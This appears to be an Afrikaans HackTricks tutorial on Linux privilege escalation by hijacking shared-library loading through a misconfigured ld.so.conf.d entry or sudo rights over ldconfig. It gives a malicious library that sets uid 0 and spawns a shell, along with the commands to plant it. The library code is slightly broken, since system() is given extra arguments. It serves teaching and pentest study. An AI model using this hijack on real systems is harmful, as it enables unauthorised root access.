# ld.so privesc exploit voorbeeld

{{#include ../../banners/hacktricks-training.md}}

## Berei die omgewing voor

In die volgende afdeling kan jy die kode van die lêers vind wat ons gaan gebruik om die omgewing voor te berei

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Skep** daardie lêers op jou masjien in dieselfde gids
2. **Kompileer** die **biblioteek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopieer** `libcustom.so` na `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
4. **Kompileer** die **uitvoerbare**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kontroleer die omgewing

Kontroleer dat _libcustom.so_ **gelaai** word vanaf _/usr/lib_ en dat jy die binêre kan **uitvoer**.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

In hierdie scenario gaan ons veronderstel dat **iemand 'n kwesbare ingang geskep het** binne 'n lêer in _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Die kwesbare gids is _/home/ubuntu/lib_ (waar ons skryfbare toegang het).\
**Laai en kompileer** die volgende kode binne daardie pad:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Nou dat ons die **kwaadwillige libcustom biblioteek binne die verkeerd geconfigureerde** pad geskep het, moet ons wag vir 'n **herlaai** of vir die root gebruiker om **`ldconfig`** uit te voer (_in die geval dat jy hierdie binaire as **sudo** kan uitvoer of dit die **suid bit** het, sal jy dit self kan uitvoer_).

Sodra dit gebeur het, **herkontroleer** waar die `sharevuln` uitvoerbare lêer die `libcustom.so` biblioteek laai vanaf:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Soos jy kan sien, dit **laai dit vanaf `/home/ubuntu/lib`** en as enige gebruiker dit uitvoer, sal 'n shell uitgevoer word:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Let daarop dat ons in hierdie voorbeeld nie privaathede verhoog het nie, maar deur die opdragte wat uitgevoer word te verander en **te wag vir root of 'n ander bevoorregte gebruiker om die kwesbare binêre uit te voer** sal ons in staat wees om privaathede te verhoog.

### Ander miskonfigurasies - Dieselfde kwesbaarheid

In die vorige voorbeeld het ons 'n miskonfigurasie gefak waar 'n administrateur **'n nie-bevoorregte gids binne 'n konfigurasie-lêer binne `/etc/ld.so.conf.d/`** gestel het.\
Maar daar is ander miskonfigurasies wat dieselfde kwesbaarheid kan veroorsaak, as jy **skryfregte** in 'n of ander **konfigurasie-lêer** binne `/etc/ld.so.conf.d`s, in die gids `/etc/ld.so.conf.d` of in die lêer `/etc/ld.so.conf` het, kan jy dieselfde kwesbaarheid konfigureer en dit benut.

## Exploit 2

**Neem aan jy het sudo-regte oor `ldconfig`**.\
Jy kan aan `ldconfig` **aanwys waar om die konfig-lêers te laai**, so ons kan dit benut om `ldconfig` te laat laai willekeurige gidse.\
So, kom ons skep die lêers en gidse wat nodig is om "/tmp" te laai:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nou, soos aangedui in die **vorige exploit**, **skep die kwaadwillige biblioteek binne `/tmp`**.\
En laastens, laat ons die pad laai en kyk waar die binêre die biblioteek van laai:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Soos jy kan sien, as jy sudo-regte oor `ldconfig` het, kan jy dieselfde kwesbaarheid benut.**

{{#include ../../banners/hacktricks-training.md}}
